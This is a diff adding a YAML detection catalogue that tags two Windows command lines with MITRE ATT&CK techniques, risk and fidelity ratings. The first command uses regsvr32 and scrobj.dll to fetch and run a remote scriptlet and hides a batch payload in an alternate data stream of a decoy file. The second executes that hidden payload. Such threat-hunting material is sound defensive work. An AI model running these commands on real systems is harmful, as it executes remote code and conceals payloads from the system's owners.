@@ -1,0 +1,44 @@
+- command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
+  description: Utilize cmd.exe and regsvr32 to download a remote file, add it to an alternate data stream (ADS) and execute the payload.
+  killchain:
+    - Installation
+    - Actions on Objectives
+  mitre:
+    Execution:
+      - T1059.003
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Cmd/
+  risk: High
+  risk_reason: It is extremely suspicious for a user to be pushing data into an ADS, especially combined with the regsvr32 abuse.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is extremely uncommon in most organizations.
+  tool: cmd
+  threatactors:
+    N/A:
+      - N/A
+- command: cmd.exe - < fakefile.doc:payload.bat
+  description: Utilize cmd.exe to execute a payload.bat previously embedded as an ADS in fakefile.doc.
+  killchain:
+    - Installation
+    - Actions on Objectives
+  mitre:
+    Execution:
+      - T1059.003
+    Defense Evasion:
+      - T1564.004
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Cmd/
+  risk: High
+  risk_reason: It is extremely suspicious for a user to be pushing executing files embedded in an ADS of another file.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is extremely uncommon in most organizations.
+  tool: cmd
+  threatactors:
+    N/A:
+      - N/A
